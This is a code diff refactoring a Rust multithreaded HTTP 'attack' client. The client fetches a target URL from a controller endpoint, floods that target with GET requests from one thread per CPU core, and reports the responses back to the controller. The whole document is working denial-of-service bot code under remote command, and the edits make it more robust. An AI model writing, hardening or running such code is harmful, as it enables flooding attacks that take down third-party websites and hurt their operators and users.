@@ -7,7 +7,7 @@ use dashmap::DashMap;
 //client struct
 struct Client {
     host_address: String,
-    address: String,
+    address: Option<String>,
     attacking: bool,
     workers: Vec<Arc<(Mutex<Worker>, Condvar)>>,
     worker_threads: Vec<std::thread::JoinHandle<()>>,
@@ -21,54 +21,52 @@ struct Worker {
     id: u32,
     host_address: String,
     attacking: bool,
-    address: String,
+    address: Option<String>,
     client: reqwest::blocking::Client,
     results: Arc<DashMap<u32, Vec<String>>>,
 }
 
 //worker methods
 impl Worker {
-    //constructor
-    fn new(addr: String, host: String, map: Arc<DashMap<u32, Vec<String>>>, id: u32) -> Worker {
+    fn new(addr: Option<String>, host: String, map: Arc<DashMap<u32, Vec<String>>>, id: u32) -> Worker {
         let client = reqwest::blocking::Client::new();
         let mut add = host.clone();
         add.push_str("/attack_info");
         Worker { host_address: add, attacking: false, address: addr, client, results: map, id }
     }
 
-    //sends 1 request and returns 0 if successful, 1 if not, pushes to the map results
     fn start_requesting(&self) -> i32 {
         if self.attacking {
-            let to_attack = self.address.as_str();
-            let result =    lient.get(to_attack).send();
-            return match result {
-                Ok(_) => {
-                    let res = result.unwrap();
-                    let code = res.status().as_u16().to_string();
-                    let body = res.text().unwrap();
-                    let response_body = serde_json::json!({"code": code, "body":body});
-                    let local_instance = self.results.clone();
-                    local_instance.get_mut(&self.id).unwrap().push(response_body.to_string());
-                    0
+            if let Some(to_attack) = &self.address {
+                let result = self.client.get(to_attack).send();
+                match result {
+                    Ok(res) => {
+                        let code = res.status().as_u16().to_string();
+                        let body = res.text().unwrap_or_default();
+                        let response_body = serde_json::json!({"code": code, "body":body});
+                        let local_instance = self.results.clone();
+                        local_instance.entry(self.id).or_insert_with(Vec::new).push(response_body.to_string());
+                        0
+                    }
+                    Err(_) => 1,
                 }
-                Err(_) => {
-                    1
-                }
-            };
+            } else {
+                1
+            }
+        } else {
+            1
         }
-        1
     }
 }
 
 //client methods
 impl Client {
-    //constructor
     fn new(host: String) -> Client {
         let thread_count = std::thread::available_parallelism().unwrap().get();
         let (tx, _) = mpsc::channel();
         let mut cl = Client {
             host_address: host,
-            address: String::new(),
+            address: None,
             attacking: false,
             workers: vec![],
             worker_threads: vec![],
@@ -79,37 +77,32 @@ impl Client {
 
         cl.worker_threads.reserve(thread_count);
         for i in 0..thread_count {
-            cl.results.insert(i as u32, vec![]);
+            cl.results.entry(i as u32).or_insert_with(Vec::new);
             cl.workers.push(Arc::new((
                 Mutex::new(Worker::new(cl.address.clone(), cl.host_address.clone(), cl.results.clone(), i as u32)),
                 Condvar::new()
             )));
         }
-        return cl;
+        cl
     }
 
     fn can_attack(&mut self) {
         let url = self.host_address.as_str();
-        let req = reqwest::blocking::get(format!("{}/api/attack", url)).unwrap().json::<String>().unwrap().
-            strip_prefix("{\"").unwrap().to_string().strip_suffix("\"}").unwrap().to_string();
-        let attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1];
-        let mut can_attack = !attack_address_url.is_empty();
-        self.address         = attack_address_url.to_string();
-        self.attacking = can_attack;
-        for el in self.workers.iter_mut() {
+        let req = reqwest::blocking::get(format!("{}/api/attack", url)).ok()
+            .and_then(|res| res.json::<String>().ok())
+            .and_then(|json| {
+                let s = json.strip_prefix("{\"").and_then(|s| s.strip_suffix("\"}")).unwrap_or_default();
+                s.split("\":\"").nth(1).map(|s| s.to_string())
+            });
+
+        self.address = req.clone();
+        self.attacking = req.is_some();
+        for el in &self.workers {
             let clone_el = el.clone();
-            let (mx, cv) = &*clone_el;
-            let worker_lock = mx.lock();
-            match worker_lock {
-                Ok(_) => {
-                    let mut worker = worker_lock.unwrap();
-                    worker.address = self.address.clone();
-                    worker.attacking = can_attack;
-                    if can_attack {
-                        cv.notify_one();
-                    }
-                }
-                Err(_) => {}
+            let (mx, _) = &*clone_el;
+            if let Ok(mut worker) = mx.lock() {
+                worker.address = req.clone();
+                worker.attacking = self.attacking;
             }
         }
     }
@@ -141,9 +134,8 @@ impl Client {
 
     fn run(mut self) {
         for i in 0..self.thread_count {
-            let ind = i.to_owned().clone();
+            let ind = i;
             let worker = self.workers[ind].clone();
-
             let (_, rx) = mpsc::channel();
             self.stopper = mpsc::Sender::clone(&self.stopper);
 
@@ -154,8 +146,8 @@ impl Client {
 
         self.can_attack();
 
-        let addr = self.host_address.to_owned().clone();
-        let armap = self.results.to_owned().clone();
+        let addr = self.host_address.clone();
+        let armap = self.results.clone();
         let handl = std::thread::spawn(move || {
             let time = time::Duration::from_millis(950);
             let cl = reqwest::blocking::Client::new();
@@ -168,7 +160,7 @@ impl Client {
                 }
                 println!("Throughput: {}", request_body_vec.len());
                 if request_body_vec.len() >= 20 {
-                    cl.post(format!("{}/attack_info", addr.to_owned().clone())).json(&request_body_vec).send().unwrap();
+                    cl.post(format!("{}/attack_info", addr)).json(&request_body_vec).send().unwrap_or_else(|_| ());
                     map.alter_all(|_, mut v| {
                         v.clear();
                         v
@@ -189,7 +181,7 @@ impl Client {
 
     fn stop(self) {
         for _ in &self.worker_threads {
-            self.stopper.send(()).unwrap();
+            self.stopper.send(()).unwrap_or_else(|_| ());
         }
     }
 }
@@ -198,15 +190,4 @@ impl Client {
 pub extern "C" fn main() {
     let mut cl = Client::new(String::from("http://localhost:8080"));
     cl.run();
-    // at some point you would call cl.stop() to stop the threads
-    //cl.stop();
 }
-
-
-// You would want to call cl.stop() at some point to stop the threads. For example, you might call cl.stop() in a signal handler,
-//  or in response to a command from the user. Note that cl.run() currently contains an infinite loop, which you'd 
-//  need to replace with appropriate stopping condition. This loop was there in the provided code and I have kept it for consistency.
-// 
-// The new stop() method signals all worker threads to stop by sending a message on the Sender. Each worker thread has a
-//  Receiver and checks it in each iteration of its main loop. If it receives a message (or if the Sender is dropped, which
-//  happens when all copies of the Sender go out of scope), it breaks out of the loop and ends.
